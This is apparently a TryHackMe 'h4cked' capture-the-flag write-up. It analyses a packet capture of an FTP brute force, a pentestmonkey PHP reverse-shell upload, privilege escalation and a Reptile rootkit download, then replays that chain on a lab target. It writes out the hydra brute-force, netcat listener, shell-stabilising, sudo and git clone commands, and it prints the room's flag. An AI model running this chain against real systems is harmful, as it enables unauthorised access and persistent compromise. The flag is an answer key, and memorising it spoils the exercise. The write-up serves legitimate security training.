# CTF Write-Up: [h4cked](https://tryhackme.com/room/h4cked)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## 🚩 Flags

<details>
<summary>Flag</summary>

`ebcefd66ca4b559d17b440b6e67fd0fd`

</details>

---

## Overview

This room is split into two parts. **Task 1** involves analysing a provided `.pcapng` file in Wireshark to reconstruct what an attacker did to compromise a machine. **Task 2** involves replicating the exact same attack against a live target to retrieve the flag.

---

## Task 1 — PCAP Analysis

---

### Q1. It seems like our machine got hacked by an anonymous threat actor. However, we are lucky to have a .pcap file from the attack. Can you determine what happened? Download the .pcap file and use Wireshark to view it.

No answer needed. Opened in Wireshark: `Capture_1612220005488.pcapng`

The file reveals a full record of the attacker's activity — from initial brute-force attempts through to post-exploitation.

---

### Q2. The attacker is trying to log into a specific service. What service is this?

Filtering by FTP traffic in Wireshark revealed the attacker was repeatedly attempting to authenticate:

```
Frame 49 — Response: 220 Hello FTP World!
```

**Answer: FTP**

---

### Q3. There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?

The pattern of rapid successive login attempts across a service is characteristic of **Hydra** (by Van Hauser / THC), the most widely used network login brute-forcing tool.

**Answer: Hydra**

---

### Q4. The attacker is trying to log on with a specific username. What is the username?

Filtering for `FTP` requests and inspecting the `USER` command:

```
Frame 49 — Request: USER jenny
```

**Answer: jenny**

---

### Q5. What is the user's password?

Following the FTP stream, the attacker eventually received a `230 Login successful` response after submitting:

```
Frame 394 — Request: PASS password123
Frame 395 — Response: 230 Login successful.
```

**Answer: password123**

---

### Q6. What is the current FTP working directory after the attacker logged in?

After logging in, the attacker issued a `PWD` command:

```
Frame 400 — Request: PWD
Frame 401 — Response: 257 "/var/www/html" is the current directory
```

**Answer: /var/www/html**

---

### Q7. The attacker uploaded a backdoor. What is the backdoor's filename?

The attacker used the FTP `STOR` command to upload a file:

```
Frame 425 — Request: STOR shell.php
```

**Answer: shell.php**

---

### Q8. The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?

Filtering with `tcp.stream eq 18` in Wireshark showed the FTP-DATA stream containing the uploaded `shell.php`. The file is a standard pentestmonkey PHP reverse shell, which references its own source URL inside the code:

```
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
```

**Answer: http://pentestmonkey.net/tools/php-reverse-shell**

---

### Q9. Which command did the attacker manually execute after getting a reverse shell?

After uploading `shell.php`, the attacker triggered it via HTTP. Filtered using `tcp.stream eq 20` in Wireshark, then right-clicked → **Follow → TCP Stream** to view the full interactive reverse shell session. The first command executed was:

```
whoami
```

**Answer: whoami**

---

### Q10. What is the computer's hostname?

Visible in the banner output at the top of the TCP stream:

```
Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 22:26:54 up  2:21,  1 user,  load average: 0.02, 0.07, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jenny    tty1     -                20:06   37.00s  1.00s  0.14s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

**Answer: wir3**

---

### Q11. Which command did the attacker execute to spawn a new TTY shell?

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Answer: python3 -c 'import pty; pty.spawn("/bin/bash")'**

---

### Q12. Which command was executed to gain a root shell?

After switching to `jenny` with `su jenny` (reusing the FTP password), the attacker checked sudo privileges and found `(ALL : ALL) ALL`. Root was obtained with:

```
sudo su
```

**Answer: sudo su**

---

### Q13. The attacker downloaded something from GitHub. What is the name of the GitHub project?

```
git clone https://github.com/f0rb1dd3n/Reptile.git
```

**Answer: Reptile**

---

### Q14. The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?

Reptile is a **Linux kernel module** designed to hide processes, files, and network connections from the system. This class of persistent, stealthy backdoor is known as a **rootkit**.

**Answer: rootkit**

---

## Task 2 — Replicating the Attack

With the full attack chain understood from the PCAP, the same steps were replicated against the live target. The attacker had changed `jenny`'s password since the original compromise, so Hydra was used to recover the new one.

---

### Step 1: Brute-Force FTP

```bash
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://<IP_ADDRESS>
```

```
[21][ftp] host: <IP_ADDRESS>   login: jenny   password: 987654321
```

New password: **`987654321`**

---

### Step 2: Download and Re-upload the Web Shell

The attacker's `shell.php` was already present on the server. It was downloaded, updated with the attacking machine's IP and listener port, and re-uploaded via FTP:

```bash
ftp <IP_ADDRESS>
# Username: jenny
# Password: 987654321
```

```
ftp> get shell.php
```

The IP and port fields inside `shell.php` were updated:

```php
$ip = '<tun0>';
$port = 80;
```

```
ftp> put shell.php
```

---

### Step 3: Start a Listener

```bash
nc -lvnp 80
```

---

### Step 4: Trigger the Web Shell

Visiting `http://<IP_ADDRESS>/shell.php` in a browser executed the reverse shell. A connection was received as `www-data`.

The shell was then stabilised to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

✅ Shell as `www-data`.

---

### Step 5: Escalate to jenny

```bash
su jenny
# Password: 987654321
```

---

### Step 6: Escalate to root

```bash
sudo su
# Password: 987654321
```

`jenny` had full sudo privileges `(ALL : ALL) ALL` — one `sudo su` was enough.

✅ Root shell obtained.

---

### Flag

```bash
root@ip-10-48-133-160:~/Reptile# cat flag.txt
ebcefd66ca4b559d17b440b6e67fd0fd
```

> 🚩 `ebcefd66ca4b559d17b440b6e67fd0fd`

---

## Attack Chain

```
PCAP Analysis (Task 1)
    └─► FTP brute-force with Hydra → jenny:password123
    └─► FTP login → PWD = /var/www/html
    └─► STOR shell.php (pentestmonkey PHP reverse shell)
    └─► HTTP GET /shell.php → reverse shell as www-data
    └─► su jenny (password reuse) → sudo su → root
    └─► git clone Reptile (rootkit) → persistent backdoor installed

Attack Replication (Task 2)
    └─► Hydra FTP brute-force → jenny:987654321 (password changed)
    └─► FTP download existing shell.php → update IP/port → re-upload
    └─► HTTP GET /shell.php → reverse shell as www-data
    └─► su jenny → sudo su → root
    └─► cat /root/Reptile/flag.txt → flag
```

---

## Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---------------|--------|------------|
| 1 | Weak FTP password susceptible to brute-force | Attacker gained FTP access as `jenny` | Enforce strong password policy; implement account lockout after failed attempts; disable FTP in favour of SFTP |
| 2 | FTP write access to web root (`/var/www/html`) | Attacker uploaded a PHP reverse shell directly to the web server | Restrict FTP write permissions; web root should never be FTP-writable |
| 3 | PHP execution enabled in web root | Uploaded `shell.php` executed as `www-data` on HTTP request | Disable PHP execution in upload directories; use a WAF |
| 4 | Password reuse across FTP and system account | FTP password accepted for `su jenny` | Enforce unique passwords per service and system account |
| 5 | `(ALL : ALL) ALL` sudo privileges for unprivileged user | Trivial escalation to root via `sudo su` | Follow principle of least privilege; never grant unrestricted sudo |
| 6 | Rootkit (Reptile) installed post-compromise | Persistent kernel-level backdoor — extremely difficult to detect and remove | Monitor kernel module loads; use file integrity monitoring; rebuild the system from a known-good image after confirmed compromise |

---

*h4cked — TryHackMe | Completed ✅*
